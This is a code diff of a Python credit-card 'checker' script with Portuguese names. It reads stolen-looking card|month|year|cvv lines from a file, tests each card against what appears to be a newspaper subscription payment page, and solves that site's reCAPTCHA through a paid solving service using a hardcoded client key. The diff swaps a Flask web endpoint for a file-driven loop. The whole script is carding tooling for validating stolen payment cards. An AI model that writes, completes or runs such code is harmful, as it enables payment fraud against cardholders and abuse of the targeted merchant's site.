@@ -1,9 +1,6 @@
 import csv
 import json
-from flask import Flask, request, render_template, jsonify
-from flask_cors import CORS
 import os
-import http.client
 import threading, requests, random, time, random, re
 from urllib3 import disable_warnings
 from colorama import Fore
@@ -11,37 +8,17 @@ from colorama import Fore
 
 disable_warnings()
 
-    
-app = Flask(__name__)
 
-CORS(app)
-    
+
+
+
 def pegarItem(data, esquerda, direita):
     return data.partition(esquerda)[-1].partition(direita)[0]
 
-def criarTask():
-    data = {
-        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
-        "task": {
-            "type": "RecaptchaV2TaskProxyless",
-            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
-            "websiteKey": "6Lcb5mcaAAAAAOOmjTu_EvLbKXpFw8xBO-jDg0Sf",
-        },
-    }
-    criar = requests.post(
-        "https://api.capmonster.cloud/createTask", verify=False, json=data
-    )
-    taskId = criar.json()["taskId"]
-    while True:
-        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
-        resultado = requests.post(
-            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
-        )
-        print(resultado.text)
-        if '"status":"ready"' in resultado.text:
-            return resultado.json()["solution"]["gRecaptchaResponse"]
-        time.sleep(1)
 
+class RequisicaoException(Exception):
+    def __init__(self):
+        super().__init__()
 
 def api_bin(bin):
     try:
@@ -67,33 +44,40 @@ def api_bin(bin):
     except:
         return "SEM INFORMAÇÃO DA BIN"
     
+    
 
-class RequisicaoException(Exception):
-    def __init__(self):
-        super().__init__()
 
+
+def criarTask():
+    data = {
+        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
+        "task": {
+            "type": "RecaptchaV2TaskProxyless",
+            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
+            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
+        },
+    }
+    criar = requests.post(
+        "https://api.capmonster.cloud/createTask", verify=False, json=data
+    )
+    taskId = criar.json()["taskId"]
+    while True:
+        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
+        resultado = requests.post(
+            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
+        )
+        print(resultado.text)
+        if '"status":"ready"' in resultado.text:
+            return resultado.json()["solution"]["gRecaptchaResponse"]
+        time.sleep(1)
+        
+        
 
 def reteste(card, month, year, cvv):
         checker(card, month, year, cvv)
 
 
 
-def definir_tipo_cartao(card):
-    if card.startswith("4"):
-        return "VISA"
-    elif card.startswith(("51", "52", "53", "54", "55")):
-        return "MASTER"
-    elif card.startswith(("34", "37")):
-        return "American Express"
-    elif card.startswith("6"):
-        return "Discover"
-    else:
-        return "Desconhecido"
-    
-
-    
-    
-    
 def checker(card, month, year, cvv):
     
     try:    
@@ -296,45 +280,18 @@ def checker(card, month, year, cvv):
     except RequisicaoException:
         print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
         reteste(card, month, year, cvv)
-            
 
-
-def processar_cartoes(card,mes,ano,cvv):
-    try:
-        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
-            retorno = checker(card,mes,ano,cvv)
-            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
-        else:
-            return {"code": "", "retorno": "erro no formulario"}
-    except:
-        #retorno = checker(card,mes,ano,cvv)
-        return {"code": "", "retorno": "Exception"}
-    
     
 
-            
-            
-@app.route('/', methods=['GET'])
+
+
 def iniciarChk():
-    return "@Engenieiro"
+    for linha in open('lista.txt', encoding='utf-8').read().splitlines():
+        card, month, year, cvv = linha.split("|")
+        checker(card, month, year, cvv)
+        # if threading.active_count() < 5:
+        #     threading.Thread(target=criarTask, args=()).start()
+        # else:
+        #     threading.enumerate()[-1].join()
 
-
-@app.route('/chk', methods=['GET'])
-def chk():
-    args = request.args
-    print(args)
-    card = args.get('card')
-    mes = args.get('mes')
-    ano = args.get('ano')
-    cvv = args.get('cvv')
-    return jsonify(processar_cartoes(card,mes,ano,cvv))
-
-
-
-if __name__ == '__main__':
-    app.run(host='localhost', port=5000, debug=True)
-    
-    
-    
-    
-
+iniciarChk()
